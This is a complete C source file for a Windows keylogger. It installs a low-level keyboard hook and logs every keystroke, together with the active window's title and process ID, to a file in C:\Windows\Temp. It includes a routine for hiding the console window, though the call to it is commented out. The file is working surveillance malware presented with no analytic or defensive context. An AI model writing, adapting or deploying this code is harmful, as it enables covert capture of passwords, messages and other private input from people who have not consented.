#include "windows.h"
#include "stdio.h"

#define KEYLOG_FILE_PATH  L"C:\\Windows\\Temp\\Keylogger.txt"
#define KEYLOG_BUFFER_LEN 250
#define KEYLOG_CLASS_NAME L"KeylogClass"

HANDLE	g_FileHandle = NULL;
WCHAR	g_TitleBuffer[KEYLOG_BUFFER_LEN + 1] = { 0 };


VOID	HideConsole() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
}


BOOL	IsConsoleVisible() {
	return IsWindowVisible(GetConsoleWindow()) != FALSE;
}


VOID	ProcessWindowTitle()
{
	WCHAR	Buffer[KEYLOG_BUFFER_LEN + 1] = { 0 };
	WCHAR	Title[KEYLOG_BUFFER_LEN + 1] = { 0 };
	DWORD	ProcessId = { 0 };
	HWND	CurrentWindow = { 0 };
	DWORD	BytesWritten = { 0 };

	RtlSecureZeroMemory(Buffer, sizeof(Buffer));
	RtlSecureZeroMemory(Title, sizeof(Title));

	//
	// get current foreground/active window title
	// and log it into the file if it has changed 
	if ((CurrentWindow = GetForegroundWindow())) {
		//
		// get the window title name and the associated process id 
		GetWindowThreadProcessId(CurrentWindow, &ProcessId);
		if (!GetWindowTextW(CurrentWindow, Buffer, sizeof(Buffer))) {
			swprintf(Buffer, KEYLOG_BUFFER_LEN, L"(No Title)");
		}

		//
		// check when ever the title has been changed.
		// if yes then log the current window to the file 
		if (wcsncmp(g_TitleBuffer, Buffer, wcslen(Buffer)) != 0) {
			memcpy(g_TitleBuffer, Buffer, sizeof(Buffer));

			swprintf(Title, sizeof(Title), L"\n\n[%ld] %ls\n", ProcessId, g_TitleBuffer);

			if (!WriteFile(g_FileHandle, Title, (DWORD)wcslen(Title) * sizeof(wchar_t), &BytesWritten, NULL)) {
				printf("[-] WriteFile Failed with Error: %lu\n", GetLastError());
				return;
			}
		}
	}
}


VOID	ProcessKey(UINT key) {

	WCHAR	Unicode[2] = { 0 };
	BYTE	Keyboard[256] = { 0 };
	WCHAR	Buffer[KEYLOG_BUFFER_LEN + 1] = { 0 };
	DWORD	BytesWritten = { 0 };

	RtlSecureZeroMemory(Keyboard, sizeof(Keyboard));
	RtlSecureZeroMemory(Unicode, sizeof(Unicode));
	RtlSecureZeroMemory(Buffer, sizeof(Buffer));

	//
	// log the current window title if it has been changed 
	ProcessWindowTitle();

	//
	// before calling GetKeyboardState we are going
	// to GetKeyState to properly get the keyboard state
	GetKeyState(VK_CAPITAL);
	GetKeyState(VK_SCROLL);
	GetKeyState(VK_NUMLOCK);
	GetKeyState(VK_SHIFT);
	GetKeyboardState(Keyboard);

	switch (key) {

	case VK_CONTROL:
		//
		// it is just CTRL by itself so not worth logging 
		break;

	case VK_ESCAPE:
		swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[ESCAPE]");
		break;

	case VK_RETURN:
		swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[RETURN]");
		break;

	case VK_BACK:
		swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[BACK]");
		break;

	case VK_TAB:
		swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[TAB]");
		break;

	case VK_SPACE:
		swprintf(Buffer, KEYLOG_BUFFER_LEN, L" ");
		break;

	default:
		if (ToUnicode(key, MapVirtualKeyW(key, MAPVK_VK_TO_VSC), Keyboard, Unicode, 1, 0) > 0) {
			swprintf(Buffer, KEYLOG_BUFFER_LEN, L"%ls", Unicode);
		}
	}

	//
	// write the logged keystroke to the file
	if (!WriteFile(g_FileHandle, Buffer, (DWORD)wcslen(Buffer) * sizeof(WCHAR), &BytesWritten, NULL)) {
		printf("[-] WriteFile Failed with Error: %lu\n", GetLastError());
		return;
	}
}

LRESULT CALLBACK	WndCallback(int code, WPARAM wparam, LPARAM lparam) {

	KBDLLHOOKSTRUCT	*pkey = (KBDLLHOOKSTRUCT*)lparam;
	if (wparam == WM_KEYDOWN)
		ProcessKey(pkey->vkCode);

	return CallNextHookEx(NULL, code, wparam, lparam);
}


int	main() {

	MSG	msg = { 0 };

	g_FileHandle = CreateFileW(KEYLOG_FILE_PATH, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (g_FileHandle == INVALID_HANDLE_VALUE) {
		printf("[-] CreateFileW Failed with Error: %lu\n", GetLastError());
		goto QUIT;
	}
	/*
	HideConsole();
	if (IsConsoleVisible())
		goto QUIT;
	*/
	printf("The program has started.\n");
	HHOOK hhook = SetWindowsHookExA(WH_KEYBOARD_LL, WndCallback, NULL, 0);
	if (hhook == NULL)
		printf("The hook wasn't installed.\n");

	// Start the message loop. 

	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

QUIT:
	if (g_FileHandle) {

		CloseHandle(g_FileHandle);
	}

	DestroyWindow(GetConsoleWindow());
	UnregisterClassW(KEYLOG_CLASS_NAME, GetModuleHandle(NULL));
}